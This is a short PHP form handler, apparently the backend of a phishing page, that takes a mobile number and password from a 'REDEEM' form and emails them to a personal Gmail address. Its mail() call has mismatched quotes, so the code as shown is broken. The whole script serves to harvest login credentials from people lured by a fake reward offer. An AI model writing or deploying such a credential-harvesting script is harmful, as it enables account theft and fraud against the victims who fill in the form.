<?php

 if (empty($_POST['REDEEM']))
{
 echo "Form is not submitted!";

exit;
}

if (empty($_POST["MobileNo"] ) ||

 empty($_POST["Password"]) 
) 
{
 echo "Please Fill the Form";
 exit;
}
$MobileNo= $_POST["MobileNo"];
$Password= $_POST["Password"];

mail('yk861595@gmail.com','New form submission," New form submission: MobileNo: $MobileNo, Password:$Password");
?>















	




